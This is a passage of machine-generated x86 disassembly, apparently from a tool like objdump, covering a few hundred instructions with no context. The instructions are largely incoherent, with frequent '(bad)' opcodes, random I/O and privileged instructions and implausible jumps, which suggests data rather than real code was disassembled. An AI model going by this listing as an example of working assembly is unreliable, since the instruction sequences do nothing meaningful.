  42b204:	jb     0x42b1f6
  42b206:	push   ebx
  42b207:	shr    BYTE PTR [eax],0x39
  42b20a:	int    0x7f
  42b20c:	dec    ebx
  42b20d:	popa   
  42b20e:	fyl2xp1 
  42b210:	add    BYTE PTR [ebx],cl
  42b212:	into   
  42b213:	ror    BYTE PTR [ebx+0x10da174a],1
  42b219:	jp     0x42b212
  42b21b:	stc    
  42b21c:	(bad)  
  42b21d:	sti    
  42b21e:	fadd   DWORD PTR [ecx]
  42b220:	ror    DWORD PTR [edx-0x12],0x1
  42b224:	shr    DWORD PTR [ebx-0x30],0x1
  42b228:	rol    BYTE PTR [edx-0x79b3db3c],1
  42b22e:	mov    ?,edi
  42b230:	test   BYTE PTR [edx-0x40b27b17],dl
  42b236:	fadd   DWORD PTR [eax]
  42b238:	call   0x433c5b
  42b23d:	inc    eax
  42b23e:	sub    BYTE PTR [ebp+0x54b400f6],al
  42b244:	cmp    BYTE PTR [ebx+ecx*8],al
  42b247:	fsubr  DWORD PTR [eax+0x40]
  42b24a:	or     al,0x0
  42b24c:	cli    
  42b24d:	dec    BYTE PTR [edi]
  42b24f:	mov    cl,0x50
  42b251:	mov    edi,ebp
  42b253:	push   eax
  42b254:	(bad)  
  42b255:	call   0x38898f
  42b25a:	call   DWORD PTR [edi+eax*1]
  42b25d:	test   BYTE PTR [eax-0x2f],ah
  42b260:	add    BYTE PTR [eax],al
  42b262:	lock shl BYTE PTR [esp+ecx*2],0xf0
  42b267:	test   eax,0xc2d45600
  42b26c:	sbb    al,0x8b
  42b26e:	(bad)
  42b271:	outs   dx,BYTE PTR ds:[esi]
  42b272:	dec    ebx
  42b273:	fsub   st,st(7)
  42b275:	hlt    
  42b276:	aad    0x1c
  42b278:	imul   DWORD PTR [eax+0x7b]
  42b27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b27c:	adc    DWORD PTR [eax],eax
  42b27e:	popa   
  42b27f:	ror    BYTE PTR [ebx-0x7e5290ac],cl
  42b285:	iret   
  42b286:	xchg   ebx,eax
  42b287:	mov    bh,dl
  42b289:	(bad)  
  42b28a:	bound  esp,QWORD PTR [ebx+0x7655bf88]
  42b290:	(bad)  
  42b291:	(bad)  
  42b292:	sbb    eax,0x9ec163f2
  42b297:	(bad)  
  42b298:	and    ecx,DWORD PTR [eax]
  42b29a:	fst    DWORD PTR [ebx-0x4e83ec9a]
  42b2a0:	dec    eax
  42b2a1:	and    al,0x45
  42b2a3:	or     bl,BYTE PTR [edi+edi*8-0x20d8b00]
  42b2aa:	cli    
  42b2ab:	push   edi
  42b2ac:	inc    edx
  42b2ad:	repnz aas 
  42b2af:	bound  esi,QWORD PTR [ebp-0x3c]
  42b2b2:	xchg   BYTE PTR [esi],ah
  42b2b4:	push   cs
  42b2b5:	es or  ebp,edi
  42b2b8:	mov    ah,0x62
  42b2ba:	cmp    DWORD PTR [esi],esp
  42b2bc:	push   cs
  42b2bd:	and    eax,0x87545675
  42b2c2:	inc    ebx
  42b2c3:	xchg   bh,bl
  42b2c5:	bound  edi,QWORD PTR [ecx]
  42b2c7:	push   ds
  42b2c8:	(bad)  
  42b2c9:	sbb    eax,0x5646774
  42b2ce:	and    BYTE PTR [edx-0xe],0x87
  42b2d2:	push   ebx
  42b2d3:	inc    esi
  42b2d4:	rol    BYTE PTR [esi-0x77dcc18d],cl
  42b2da:	(bad)
  42b2dd:	jle    0x42b2bf
  42b2df:	arpl   si,dx
  42b2e1:	add    esi,DWORD PTR [esi]
  42b2e3:	stos   BYTE PTR es:[edi],al
  42b2e4:	fld    QWORD PTR [eax]
  42b2e6:	test   BYTE PTR [ebx+0x606610e5],ch
  42b2ec:	retf   0xec88
  42b2ef:	push   ebp
  42b2f0:	mov    ch,0x48
  42b2f2:	and    al,0xce
  42b2f4:	or     BYTE PTR [bp+0x5e],ah
  42b2f8:	mov    eax,0xad5dec88
  42b2fd:	dec    eax
  42b2fe:	and    al,0xd2
  42b300:	test   ebp,0x6dda2885
  42b306:	lds    esi,FWORD PTR [ebp+0x27e3f8]
  42b30c:	mov    di,0x571f
  42b310:	dec    edx
  42b311:	push   ebp
  42b312:	and    DWORD PTR [edi+0x61],edx
  42b315:	outs   dx,DWORD PTR ds:[esi]
  42b316:	out    dx,eax
  42b317:	cmp    edi,DWORD PTR [edi+edx*8+0x4e]
  42b31b:	or     BYTE PTR [ecx+ebp*8+0x555e698f],al
  42b322:	cmp    eax,0x2894693c
  42b327:	or     dh,dl
  42b329:	dec    edi
  42b32a:	add    DWORD PTR cs:[edx],0xffffffd8
  42b32e:	addr16 in eax,0xe7
  42b331:	rcr    BYTE PTR [ecx],0x57
  42b334:	jbe    0x42b3a5
  42b336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b337:	xchg   DWORD PTR [edx-0x79b8dd5f],ebp
  42b33d:	mov    cl,0xc7
  42b33f:	add    esp,DWORD PTR [edx-0x27]
  42b342:	fimul  DWORD PTR [eax+0x26]
  42b345:	mov    ch,0xf
  42b347:	or     DWORD PTR [edx+0x360ca603],esi
  42b34d:	sar    BYTE PTR ds:0xe80be35c,1
  42b353:	or     esp,DWORD PTR [edx-0x27]
  42b356:	and    al,0xd6
  42b358:	xlat   BYTE PTR ds:[ebx]
  42b359:	jmp    0x5146be91
  42b35e:	imul   ecx,esi,0x3e7d285
  42b364:	pop    ds
  42b365:	outs   dx,DWORD PTR ds:[esi]
  42b366:	in     al,dx
  42b367:	mov    fs,WORD PTR [ecx]
  42b369:	mov    ch,0xc3
  42b36b:	xor    ebx,edi
  42b36d:	xchg   ebp,eax
  42b36e:	retf   
  42b36f:	sbb    eax,DWORD PTR [eax]
  42b371:	adc    dh,cl
  42b373:	mov    cl,0x6f
  42b375:	(bad)  
  42b376:	fptan  
  42b378:	xchg   esp,eax
  42b379:	mov    eax,ds:0xe536c6b5
  42b37e:	sub    al,0x1
  42b380:	int    0xf9
  42b382:	sti    
  42b383:	stc    
  42b384:	jmp    0xadf481fa
  42b389:	jge    0x42b33b
  42b38b:	test   DWORD PTR [ecx+eiz*2+0x73f85a9],ebp
  42b392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b393:	sbb    dh,bl
  42b395:	not    BYTE PTR [ebp-0x6a1707dc]
  42b39b:	and    al,0x11
  42b39d:	fcom   DWORD PTR [ebp-0x6a2606dc]
  42b3a3:	and    al,0xd6
  42b3a5:	or     BYTE PTR [ecx],dl
  42b3a7:	cld    
  42b3a8:	es pop ss
  42b3aa:	jb     0x42b3ec
  42b3ac:	xchg   esi,eax
  42b3ad:	jmp    0x2565:0xd4ee67f9
  42b3b4:	jne    0x42b41c
  42b3b6:	fld    DWORD PTR [eax]
  42b3b8:	jb     0x42b361
  42b3ba:	icebp  
  42b3bb:	cmp    eax,ebp
  42b3bd:	scas   al,BYTE PTR es:[edi]
  42b3be:	inc    BYTE PTR [ecx+ebp*1-0x1432aaa9]
  42b3c5:	popa   
  42b3c6:	fld    DWORD PTR [eax+0x14d7da5]
  42b3cc:	jmp    0x65c88d32
  42b3d1:	jge    0x42b421
  42b3d3:	add    ecx,ebp
  42b3d5:	add    BYTE PTR [ecx-0x32],ah
  42b3d8:	xchg   ebx,eax
  42b3d9:	test   eax,0x19c14766
  42b3de:	fld    TBYTE PTR [eax]
  42b3e0:	xchg   BYTE PTR [eax+0x6810f1a0],ch
  42b3e6:	cmp    ecx,0xfffffff9
  42b3e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3ea:	popa   
  42b3eb:	rcl    al,cl
  42b3ed:	jb     0x42b38f
  42b3ef:	sbb    cl,ah
  42b3f1:	stc    
  42b3f2:	loopne 0x42b3ec
  42b3f4:	add    BYTE PTR [esi+0x5d961],cl
  42b3fa:	or     ah,BYTE PTR [edx+0x4d]
  42b3fd:	add    dl,bh
  42b3ff:	add    al,BYTE PTR [edx]
  42b401:	rcr    ebx,0xe4
  42b404:	add    eax,edx
  42b406:	int3   
  42b407:	scas   eax,DWORD PTR es:[edi]
  42b408:	adc    al,0xe9
  42b40a:	and    al,0x18
  42b40c:	idiv   edi
  42b40e:	adc    ebx,DWORD PTR [ebp-0x7cc4e493]
  42b414:	pop    es
  42b415:	(bad)  
  42b416:	xlat   BYTE PTR ds:[ebx]
  42b417:	rol    BYTE PTR [eax-0x75],0x4c
  42b41b:	add    al,0xda
  42b41d:	add    BYTE PTR [ebp+edx*1+0x7e],cl
  42b421:	sar    ah,0x60
  42b424:	ins    DWORD PTR es:[edi],dx
  42b425:	add    cl,BYTE PTR [ebx]
  42b427:	fstp   QWORD PTR [esi-0x3f]
  42b42a:	mov    eax,0xb0700837
  42b430:	and    al,0x18
  42b432:	aad    0x1b
  42b434:	ds and al,0xb0
  42b437:	in     al,0x5e
  42b439:	rol    DWORD PTR [eax],0x7
  42b43c:	sar    DWORD PTR [ebx],0x8
  42b43f:	in     eax,0x1b
  42b441:	ds and al,0xc
  42b444:	in     eax,0x80
  42b446:	jl     0x42b3ef
  42b448:	aam    0x0
  42b44a:	(bad)  
  42b44c:	cdq    
  42b44d:	and    al,0x38
  42b44f:	dec    eax
  42b450:	es test edx,edx
  42b453:	pop    es
  42b454:	test   DWORD PTR [edx+0x7af16744],0x377a84c0
  42b45e:	dec    eax
  42b45f:	int    0x8a
  42b461:	add    esp,DWORD PTR [esi-0x6e]
  42b464:	in     al,0x74
  42b466:	or     BYTE PTR [ebp+0x60],al
  42b469:	mov    edx,0x6c0e8009
  42b46e:	in     eax,dx
  42b46f:	or     BYTE PTR [esi],0x75
  42b472:	sbb    eax,0x538bc462
  42b477:	xchg   dl,ch
  42b479:	push   0xffffffce
  42b47b:	imul   ebp,DWORD PTR [ebp+0x48],0x24
  42b47f:	outs   dx,BYTE PTR ds:[esi]
  42b480:	dec    edx
  42b481:	scas   al,BYTE PTR es:[edi]
  42b482:	bound  ax,DWORD PTR [edx]
  42b485:	jp     0x42b446
  42b487:	ins    DWORD PTR es:[edi],dx
  42b488:	jle    0x42b494
  42b48a:	(bad)  
  42b48b:	xor    eax,0x86538b02
  42b490:	fisubr DWORD PTR [ecx-0xe]
  42b493:	pop    ebx
  42b494:	add    ecx,DWORD PTR [edx+0x24]
  42b497:	jle    0x42b4b5
  42b499:	or     eax,0x18e69e8d
  42b49e:	push   eax
  42b49f:	add    BYTE PTR [edx+ecx*4+0x2626ba7],dh
  42b4a6:	in     eax,dx
  42b4a7:	sar    dh,1
  42b4a9:	(bad)  
  42b4aa:	aad    0x2e
  42b4ac:	adc    BYTE PTR [ebp+0x44],bh
  42b4af:	jae    0x42b4fa
  42b4b1:	add    dh,BYTE PTR [ecx]
  42b4b3:	fnstcw WORD PTR ds:[esi-0x189d1f14]
  42b4ba:	aad    0x83
  42b4bc:	mov    ds:0x63d479ee,al
  42b4c1:	add    bh,dh
  42b4c3:	push   esp
  42b4c4:	cmp    BYTE PTR [esi+esi*1],al
  42b4c7:	push   eax
  42b4c8:	out    dx,eax
  42b4c9:	dec    ebp
  42b4ca:	sbb    bl,BYTE PTR [eax-0x17]
  42b4cd:	cs out 0x2f,al
  42b4d0:	bound  edx,QWORD PTR [edi]
  42b4d2:	xlat   BYTE PTR ds:[ebx]
  42b4d3:	and    DWORD PTR [edx+0x63bc79fe],0x2
  42b4da:	dec    BYTE PTR [edx]
  42b4dc:	int    0xc5
  42b4de:	and    BYTE PTR [eax+0x5d],dl
  42b4e1:	jo     0x42b4a8
  42b4e3:	rol    BYTE PTR [ebx+0x6ae7c4f9],0xfb
  42b4ea:	lds    ecx,FWORD PTR [eax+0x6233d8f1]
  42b4f0:	(bad)  [ebx+0x21df622f]
  42b4f6:	sbb    al,0x5a
  42b4f8:	imul   ebp,DWORD PTR [esi],0xdc43c499
  42b4fe:	outs   dx,BYTE PTR ds:[esi]
  42b4ff:	mov    cl,0xde
  42b501:	mov    ds:0xb300ec23,al
  42b506:	and    bh,0x3
  42b509:	out    0x19,al
  42b50b:	fstp   TBYTE PTR [edi-0x16]
  42b50e:	fsub   st,st(7)
  42b510:	add    esp,ebp
  42b512:	mov    ah,BYTE PTR [ebx+0x23629030]
  42b518:	jmp    0x42b51f
  42b51a:	test   DWORD PTR [ecx-0x26],0x7ff319e1
  42b521:	xchg   esi,eax
  42b522:	fsub   st,st(7)
  42b524:	add    esi,DWORD PTR ds:0x83eb5f19
  42b52a:	mov    dl,0xa6
  42b52c:	dec    ebx
  42b52d:	test   DWORD PTR [ecx-0x1959a192],esp
  42b533:	push   edx
  42b534:	sar    BYTE PTR [edi-0x24],1
  42b537:	pop    esi
  42b538:	out    dx,eax
  42b539:	adc    BYTE PTR [ebx+0x1e],ah
  42b53c:	(bad)
  42b540:	lds    eax,FWORD PTR [esi+0x6202fad9]
  42b546:	loop   0x42b567
  42b548:	or     dh,al
  42b54a:	popf   
  42b54b:	xor    al,BYTE PTR [esi]
  42b54d:	mov    ds:0xc7c2eff8,eax
  42b552:	loope  0x42b542
  42b554:	retf   
  42b555:	loop   0x42b552
  42b557:	out    0xd8,eax
  42b559:	popf   
  42b55a:	neg    dh
  42b55c:	int    0xea
  42b55e:	in     eax,0x7a
  42b560:	lea    edx,[ebx*4+0x2e5e1b1f]
  42b567:	add    DWORD PTR [eax+eax*1],edi
  42b56a:	addr16 pusha 
  42b56c:	ds sbb eax,0x12357b35
  42b572:	push   ds
  42b573:	xchg   DWORD PTR [ecx+0x48bd0a72],edi
  42b579:	bound  edx,QWORD PTR [edi+0x3ae9bba5]
  42b57f:	idiv   cl
  42b581:	jb     0x42b59f
  42b583:	sbb    eax,esp
  42b585:	(bad)  
  42b587:	xor    ebx,DWORD PTR [esi]
  42b589:	lods   al,BYTE PTR ds:[esi]
  42b58a:	outs   dx,DWORD PTR ds:[esi]
  42b58b:	and    DWORD PTR [esi+0x8fe21ab],eax
  42b591:	sub    BYTE PTR [ecx-0x22],al
  42b594:	sbb    eax,0xa215724
  42b599:	lahf   
  42b59a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b59b:	mov    ds:0x9ee92105,al
  42b5a0:	push   eax
  42b5a1:	push   0x2c
  42b5a3:	fnsave [ebx+0x2]
  42b5a6:	xlat   BYTE PTR ds:[ebx]
  42b5a7:	inc    ecx
  42b5a8:	and    eax,0xd9648d
  42b5ad:	bound  esi,QWORD PTR [edx]
  42b5af:	mov    ebp,0xb118da18
  42b5b4:	inc    ebp
  42b5b5:	std    
  42b5b6:	pop    edx
  42b5b7:	pop    esp
  42b5b8:	test   al,0x13
  42b5ba:	mov    ebx,0xd5e568f2
  42b5bf:	cmc    
  42b5c0:	stc    
  42b5c1:	xchg   ebx,eax
  42b5c2:	pop    ecx
  42b5c3:	xchg   ecx,eax
  42b5c4:	push   eax
  42b5c5:	(bad)  
  42b5c6:	push   esp
  42b5c7:	mov    eax,ds:0xf261ad79
  42b5cc:	adc    ebp,ebp
  42b5ce:	add    BYTE PTR [ecx+0x267000b5],dh
  42b5d4:	aad    0x83
  42b5d6:	test   eax,0xe9c15d5a
  42b5db:	popa   
  42b5dc:	(bad)  
  42b5de:	jb     0x42b596
  42b5e0:	repnz stc 
  42b5e2:	add    BYTE PTR [eax],dl
  42b5e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b5e5:	sbb    al,0xe8
  42b5e7:	mov    BYTE PTR [eax+eax*1+0x24c60000],al
  42b5ee:	sbb    BYTE PTR [eax+0x22],bh
  42b5f1:	mov    DWORD PTR [ebx+0x67],ecx
  42b5f4:	add    bl,BYTE PTR [edi-0x6]
  42b5f7:	les    edx,FWORD PTR [eax]
  42b5f9:	bound  eax,QWORD PTR [eax+0x7c]
  42b5fc:	idiv   cl
  42b5fe:	imul   ecx,DWORD PTR [eax-0x49],0x76f3cf81
  42b605:	idiv   dh
  42b607:	les    esi,FWORD PTR [ecx+edi*4+0xf]
  42b60b:	iret   
  42b60c:	(bad)  
  42b60d:	cli    
  42b60e:	dec    DWORD PTR [ebx-0x7f]
  42b611:	inc    eax
  42b612:	ja     0x42b674
  42b614:	frstor [edx+0x10]
  42b617:	in     eax,0xaa
  42b619:	mov    edx,DWORD PTR [edi+ebp*2+0x79]
  42b61d:	or     edi,0xfef813a3
  42b623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b624:	je     0x42b5df
  42b626:	je     0x42b5f5
  42b628:	data16 ds and al,0xd7
  42b62c:	int3   
  42b62d:	and    BYTE PTR [ebx+eax*1-0x33],dh
  42b631:	adc    BYTE PTR [eax+eax*1-0x1],dh
  42b635:	int3   
  42b636:	or     BYTE PTR [ebp-0x23],dh
  42b639:	pop    eax
  42b63a:	jbe    0x42b660
  42b63c:	adc    al,0xd9
  42b63e:	je     0x42b69f
  42b640:	fst    QWORD PTR [edi]
  42b642:	ds and al,0xdb
  42b645:	loopne 0x42b695
  42b647:	(bad)  
  42b648:	call   esp
  42b64a:	pusha  
  42b64b:	data16 mov dh,BYTE PTR [esp-0x74573c9a]
  42b653:	inc    ebx
  42b654:	dec    edx
  42b655:	xchg   ebx,eax
  42b656:	mov    edi,0x8815f44
  42b65b:	and    BYTE PTR [edx-0x72],0x20
  42b65f:	bound  esp,QWORD PTR [edx-0x4e]
  42b662:	mov    edx,0x3874643
  42b667:	or     ebp,edi
  42b669:	mov    esi,0x188a6620
  42b66e:	add    BYTE PTR [bp+si+0x78],ah
  42b672:	inc    eax
  42b673:	and    al,0xe
  42b675:	inc    edx
  42b676:	in     eax,dx
  42b677:	(bad)  
  42b678:	fnstsw WORD PTR [edi+0x4762e943]
  42b67e:	sar    dl,cl
  42b680:	loope  0x42b627
  42b682:	and    BYTE PTR [eax-0x1fda0],dh
  42b688:	into   
  42b689:	or     al,0xd3
  42b68b:	mov    bl,0x86
  42b68d:	mov    dl,0xfe
  42b68f:	jmp    DWORD PTR [edx-0x7d]
  42b692:	out    dx,eax
  42b693:	das    
  42b694:	push   ecx
  42b695:	inc    edx
  42b696:	(bad)  
  42b697:	out    0x0,al
  42b699:	pop    ebp
  42b69a:	iret   
  42b69b:	retf   
  42b69c:	out    0xe2,eax
  42b69e:	pop    ss
  42b69f:	(bad)  
  42b6a0:	(bad)  
  42b6a1:	jmp    0x14a5a35c
  42b6a6:	fwait
  42b6a7:	rol    DWORD PTR [esi-0x1807216a],1
  42b6ad:	jb     0x42b6c7
  42b6af:	(bad)  
  42b6b0:	dec    DWORD PTR [ecx]
  42b6b2:	push   cs
  42b6b3:	xchg   esi,eax
  42b6b5:	cli    
  42b6b6:	xor    al,0xcc
  42b6b8:	cli    
  42b6b9:	in     eax,0xc6
  42b6bb:	add    eax,0x26263687
  42b6c0:	xchg   DWORD PTR [ebp-0x320dae27],esp
  42b6c6:	fidiv  DWORD PTR [ecx]
  42b6c8:	pop    edx
  42b6c9:	daa    
  42b6ca:	aaa    
  42b6cb:	test   ebx,eax
  42b6cd:	sar    bh,cl
  42b6cf:	std    
  42b6d0:	jmp    DWORD PTR [eax-0x26ad01f3]
  42b6d6:	fcomp  st(5)
  42b6d8:	sbb    BYTE PTR [edx+0x628a346c],0x5d
  42b6df:	test   al,0x4f
  42b6e1:	sub    DWORD PTR [eax+0x6033bb16],ecx
  42b6e7:	mov    bh,0x17
  42b6e9:	aaa    
  42b6ea:	outs   dx,BYTE PTR ds:[esi]
  42b6eb:	in     al,0x69
  42b6ed:	jl     0x42b684
  42b6ef:	mov    esi,0x34c039fb
  42b6f4:	icebp  
  42b6f5:	test   dh,al
  42b6f7:	fldcw  WORD PTR [bp+si]
  42b6fa:	je     0x42b6f0
  42b6fc:	mov    DWORD PTR [eax],eax
  42b6fe:	sbb    al,0x27
  42b700:	fmulp  st(5),st
  42b702:	cmp    al,0x5a
  42b704:	jle    0x42b719
  42b706:	dec    esp
  42b707:	sbb    DWORD PTR [esi-0x45],ebp
  42b70a:	mov    ds:0x3783d95f,al
  42b70f:	stos   BYTE PTR es:[edi],al
  42b710:	hlt    
  42b711:	fucom  st(1)
  42b713:	pop    es
  42b714:	hlt    
  42b715:	add    ch,BYTE PTR [ebp+0x1c89e923]
  42b71b:	pop    edi
  42b71c:	and    cl,ch
  42b71e:	cmp    ah,bl
  42b720:	cdq    
  42b721:	mov    dl,0x68
  42b723:	sub    esp,DWORD PTR [ecx]
  42b725:	pop    ds
  42b726:	or     al,0x60
  42b728:	sub    dh,BYTE PTR ds:0x3a189c59
  42b72e:	jmp    0x8fe1:0x7fc292ca
  42b735:	mov    ebp,0xc2c2d960
  42b73a:	mov    ds,WORD PTR [esi+0xc]
  42b73d:	xor    al,0x33
  42b73f:	mov    edi,DWORD PTR [ebp+0x2d]
  42b742:	fucomp st(0)
  42b744:	pop    esp
  42b745:	xor    dl,cl
  42b747:	nop
  42b748:	bswap  ebp
  42b74a:	pop    esp
  42b74b:	repz cli 
  42b74d:	xchg   DWORD PTR [esi],edx
  42b74f:	icebp  
  42b750:	add    BYTE PTR [ebx+0x1cb5b8c],al
  42b756:	mov    ah,0x3a
  42b758:	cli    
  42b759:	out    0x25,al
  42b75b:	xor    dh,BYTE PTR [esi+eiz*8-0x7]
  42b75f:	out    dx,eax
  42b760:	stc    
  42b761:	jmp    0x253d1866
  42b766:	inc    ebx
  42b767:	aas    
  42b768:	fs push esp
  42b76a:	ror    DWORD PTR [ecx+0x1],0xd5
  42b76e:	repnz xchg edi,eax
  42b770:	out    dx,eax
  42b771:	mov    ebx,DWORD PTR [esi+edx*4]
  42b774:	jl     0x42b76f
  42b776:	bound  esp,QWORD PTR [edx+edi*8-0x1070b105]
  42b77d:	sub    DWORD PTR [ecx-0x68472953],0x2f
  42b784:	repnz stc 
  42b786:	and    BYTE PTR [eax-0x3e],0xc0
  42b78a:	daa    
  42b78b:	sbb    DWORD PTR [ebx],esi
  42b78d:	push   esp
  42b78e:	jb     0x42b7da
  42b790:	mov    ds:0xe5a56252,eax
  42b795:	push   ecx
  42b796:	add    ecx,DWORD PTR [eax+0x7b]
  42b799:	add    BYTE PTR [edi+0x60860bda],bh
  42b79f:	aaa    
  42b7a0:	int    0x64
  42b7a2:	jmp    DWORD PTR [ecx+0xd9f8bd9]
  42b7a8:	jae    0x42b76e
  42b7aa:	cmc    
  42b7ab:	test   BYTE PTR [ecx],ah
  42b7ad:	jne    0x42b78e
  42b7af:	mov    edi,ebp
  42b7b1:	stc    
  42b7b2:	ss (bad) 
  42b7b4:	pop    esp
  42b7b5:	(bad)  
  42b7b6:	jno    0x42b818
  42b7b8:	cmp    DWORD PTR [ecx-0x17],eax
  42b7bb:	pop    esi
  42b7bc:	pushf  
  42b7bd:	mov    ebp,0xc9ce4b9
  42b7c2:	mov    ecx,0x156c34b
  42b7c7:	add    cl,ah
  42b7c9:	mov    bh,cl
  42b7cb:	add    BYTE PTR [eax+eax*1-0x5],bl
  42b7cf:	(bad)
  42b7d2:	or     DWORD PTR [ebp-0x3d],0x8874c872
  42b7d9:	push   ebp
  42b7da:	cmp    DWORD PTR [edx],ebp
  42b7dc:	push   es
  42b7dd:	fild   DWORD PTR [eax+0x73d58a79]
  42b7e3:	or     BYTE PTR [eax+0x1d],bh
  42b7e6:	pusha  
  42b7e7:	mov    DWORD PTR [ebp-0x1d],eax
  42b7ea:	loope  0x42b822
  42b7ec:	push   cs
  42b7ed:	mov    ah,0x2e
  42b7ef:	test   DWORD PTR [edx-0x6575dd5f],esi
  42b7f5:	jno    0x42b7c2
  42b7f7:	je     0x42b860
  42b7f9:	pop    ebp
  42b7fa:	hlt    
  42b7fb:	xor    BYTE PTR [esi+0x3],al
  42b7fe:	test   BYTE PTR [ecx+0x4a],dl
  42b801:	pop    ebp
  42b802:	hlt    
  42b803:	js     0x42b87c
  42b805:	lock jns 0x42b802
  42b808:	xchg   ebx,eax
  42b809:	mov    al,ds:0x4eb8b07
  42b80e:	xchg   esp,eax
  42b80f:	or     BYTE PTR [ebx-0x23],cl
  42b812:	loope  0x42b822
  42b814:	shr    BYTE PTR [edx+eiz*8],0x10
  42b818:	inc    edx
  42b819:	fld    QWORD PTR [eax]
  42b81b:	jmp    0x42b853
  42b81d:	retf   0x66c7
  42b820:	xchg   edx,eax
  42b821:	in     al,0x83
  42b823:	push   DWORD PTR [edi]
  42b825:	(bad)  
  42b826:	cmp    BYTE PTR [edi],0x61
  42b829:	mov    al,ds:0x1c008002
  42b82e:	fadd   QWORD PTR [eax]
  42b830:	jne    0x42b839
  42b832:	retf   0xebc0
  42b835:	add    al,0x62
  42b837:	(bad)  
  42b838:	call   0x39be36
  42b83d:	sbb    al,0x8f
  42b83f:	xchg   DWORD PTR [esi-0x3d],eax
  42b842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b843:	push   ecx
  42b844:	pop    ebp
  42b845:	(bad)  
  42b846:	les    eax,FWORD PTR ds:0xe17b3700
  42b84c:	jle    0x42b80c
  42b84e:	fiadd  DWORD PTR [eax+0x2c535eeb]
  42b854:	push   ebx
  42b855:	retf   0x370
  42b858:	cli    
  42b859:	lods   eax,DWORD PTR ds:[esi]
  42b85a:	jnp    0x42b8ae
  42b85c:	or     al,ch
  42b85e:	test   ebp,0x56b9dff
  42b864:	jg     0x42b80f
  42b866:	pop    es
  42b867:	(bad)  
  42b868:	mov    dl,0x1a
  42b86a:	into   
  42b86b:	or     ecx,0x24493f85
  42b871:	push   esi
  42b872:	xor    dh,cl
  42b874:	push   DWORD PTR [ebp-0x60]
  42b877:	or     esi,eax
  42b879:	test   al,0x66
  42b87c:	aaa    
  42b87d:	push   ss
  42b87e:	push   ds
  42b87f:	bnd jae 0x42b81a
  42b882:	int3   
  42b883:	add    dl,BYTE PTR [esi-0x44]
  42b886:	jns    0x42b8c0
  42b888:	and    al,0x6a
  42b88a:	sets   BYTE PTR [edi]
  42b88d:	xchg   edi,eax
  42b88e:	inc    ecx
  42b88f:	in     al,0x7
  42b891:	add    ah,al
  42b893:	jmp    0x42b859
  42b895:	mov    WORD PTR [esi-0x249e19e2],fs
  42b89b:	mov    ch,0x28
  42b89d:	push   ss
  42b89e:	sbb    eax,0x9d1c223e
  42b8a3:	add    bh,dh
  42b8a5:	add    BYTE PTR [edx],cl
  42b8a7:	cmp    edx,ecx
  42b8a9:	stc    
  42b8aa:	or     eax,0x97eac7b
  42b8af:	xchg   edi,eax
  42b8b0:	std    
  42b8b1:	or     ebx,0x1
  42b8b4:	(bad)  
  42b8b5:	(bad)  
  42b8b6:	jmp    0x6b819575
  42b8bb:	add    bh,dh
  42b8bd:	xchg   BYTE PTR [ebp-0x27],dl
  42b8c0:	mov    DWORD PTR [esi+0x32],edi
  42b8c3:	mov    ds:0x17a3d6c,eax
  42b8c8:	test   eax,edx
  42b8ca:	retf   
  42b8cb:	out    dx,eax
  42b8cc:	pop    esi
  42b8cd:	aam    0x44
  42b8cf:	out    dx,eax
  42b8d0:	add    al,BYTE PTR [ebx]
  42b8d2:	out    0x61,al
  42b8d4:	call   0x22a71adc
  42b8d9:	fmul   QWORD PTR [edx+esi*2-0x19]
  42b8dd:	add    edx,DWORD PTR [ebx]
  42b8df:	mov    ch,BYTE PTR [esi-0x3f]
  42b8e2:	test   DWORD PTR [edx],edx
  42b8e4:	pusha  
  42b8e5:	add    al,0x62
  42b8e7:	fs jmp 0x42b8c3
  42b8ea:	(bad)  
  42b8eb:	fcom   DWORD PTR [ebx+0x9]
  42b8ee:	xlat   BYTE PTR ds:[ebx]
  42b8ef:	mov    bl,ch
  42b8f1:	fidivr WORD PTR [edi-0x56]
  42b8f4:	xchg   ebp,eax
  42b8f5:	pop    ebp
  42b8f6:	add    BYTE PTR [esi+0x5e],bl
  42b8f9:	sub    ecx,DWORD PTR [eax]
  42b8fb:	adc    al,BYTE PTR [ebx+0x9b7ee6]
  42b901:	stc    
  42b902:	pusha  
  42b903:	pop    ecx
  42b904:	out    dx,eax
  42b905:	arpl   bx,ax
  42b907:	rcl    DWORD PTR [ecx+0x1fe50a5e],1
  42b90d:	fistp  DWORD PTR [edx+0x47ce9d85]
  42b913:	xchg   ch,al
  42b915:	repz dec eax
  42b917:	stos   BYTE PTR es:[edi],al
  42b918:	gs loopne 0x42b999
  42b91b:	sbb    al,0x2
  42b91d:	enter  0x2bd1,0xef
  42b921:	dec    esi
  42b922:	adc    DWORD PTR [ecx+ebx*8-0x7a18fb33],eax
  42b929:	or     ebp,edi
  42b92b:	add    eax,0x8d14ef7
  42b930:	push   esi
  42b931:	sub    BYTE PTR [edi+0x5e],dl
  42b934:	arpl   WORD PTR [edi+eiz*1-0x13ff529b],sp
  42b93b:	mov    ah,al
  42b93d:	test   DWORD PTR [edi],ebx
  42b93f:	or     DWORD PTR [edi-0x99e1665],eax
  42b945:	add    eax,0x1645ddd
  42b94a:	bound  esp,QWORD PTR [ebx+0x614689f6]
  42b950:	fld    DWORD PTR [ebp-0x5b866c9]
  42b956:	call   DWORD PTR [ebx+0xf6ca6f]
  42b95c:	(bad)  
  42b95d:	aad    0xe8
  42b95f:	retf   0xf317
  42b962:	stc    
  42b963:	jb     0x42b905
  42b965:	test   BYTE PTR [esi-0x7a0c4f22],0xa2
  42b96c:	scas   al,BYTE PTR es:[edi]
  42b96d:	outs   dx,DWORD PTR ds:[esi]
  42b96e:	stc    
  42b96f:	iret   
  42b970:	mov    bl,0x57
  42b972:	retf   0xd8d1
  42b975:	jnp    0x42b977
  42b977:	jmp    0xa9704cae
  42b97c:	aas    
  42b97d:	push   esi
  42b97e:	in     al,0xc
  42b980:	pushf  
  42b981:	fiadd  DWORD PTR [eax]
  42b983:	push   0xe8feaa42
  42b988:	popa   
  42b989:	mov    ebp,eax
  42b98b:	das    
  42b98c:	dec    ebp
  42b98d:	lock stc 
  42b98f:	pop    esp
  42b990:	mov    ds:0xb9124b5,al
